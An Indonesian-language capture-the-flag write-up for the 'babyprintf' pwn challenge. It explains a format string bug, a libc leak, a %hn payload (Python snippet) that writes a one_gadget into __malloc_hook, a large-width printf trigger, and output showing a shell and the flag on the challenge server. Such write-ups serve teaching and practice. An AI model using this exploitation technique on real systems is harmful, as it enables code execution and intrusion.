# babyprintf


## Analisa


Cek konfigurasi binary terlebih dulu:
```
$ file babyprintf; checksec babyprintf
babyprintf: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=f2e29b45b73a977083b2edc5d38a3359ca7a193c, not stripped
[*] '/home/tempest/projects/cscctf/2019/final/pwn/babyprintf/babyprintf'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```


Bug merupakan FSB:
```
$ ./babyprintf 
%p %p %p
0x7ffea2931310 0x7f787e49b8d0 0x7f787e1be081
```


Kita mempunyai 3 FSB sebelum program memanggil `exit`. Kesulitannya di sini adalah 3 FSB dan overwrite return address tidak memungkinkan.



## Eksploitasi


Hint yang diberikan merupakan "*Vector is in `vfprintf.c`*". Jika kita lihat source codenya `vfprintf`, terdapat snippet ini:
```C
if (width >= WORK_BUFFER_SIZE - EXTSIZ)
{
	/* We have to use a special buffer.  */
	size_t needed = ((size_t) width + EXTSIZ) * sizeof (CHAR_T);
	if (__libc_use_alloca (needed))
		workend = (CHAR_T *) alloca (needed) + width + EXTSIZ;
	else
	{
		workstart = (CHAR_T *) malloc (needed);
		...
	}
	...
}
```


Kita dapat menggunakan 3 FSB ini untuk:
1. leak libc
2. write `one_gadget` ke `__malloc_hook`
3. trigger `malloc` melalui width specifier `printf`



Kita bisa leak libc melalui return address dengan format specifier "*%43$p*". Untuk melakukan write ke `__malloc_hook`, perhatikan snippet berikut:
```Python
x = one_gadget & 0xffff
y = (one_gadget >> 2*8) & 0xffff
z = (one_gadget >> 4*8) & 0xffff
payload = "%{:d}x%24$hn%{:d}x%25$hn%{:d}x%26$hn".format(
	x,
	(y-x) & 0xffff,
	(z-y) & 0xffff,
).ljust(0x80,'\x00')
payload += p64(target)
payload += p64(target+2)
payload += p64(target+4)
payload = payload.ljust(0xf0,'\x00')
```


Layout ini dibuat kontras dengan 32-bit untuk mencegah `printf` berhenti karena null-bytes (semua address 64-bit mengandung null-bytes). Untuk perhitungan width dan size specifier seharusnya sama dengan 32-bit. Langkah terakhir adalah dengan menginput format dengan width specifier yang besar (setelah beberapa kali trial dan error seharusnya didapatkan angka > 65535).



Output script:
```
$ python exploit.py go
[*] '/home/tempest/projects/cscctf/2019/final/pwn/babyprintf/babyprintf'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] '/lib/x86_64-linux-gnu/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to babyprintf.problem.cscctf.com on port 10001: Done
[*] return address: 0x7fbe935ecb97
[*] libc address: 0x7fbe935cb000
[*] __malloc_hook: 0x7fbe939b6c30
[*] one_gadget: 0x7fbe936d538c
[*] Switching to interactive mode
$ cat /home/babyprintf/flag
CCC{printf_Use5_M4lL0C_wh4t_a_Sh0ck3r}
```
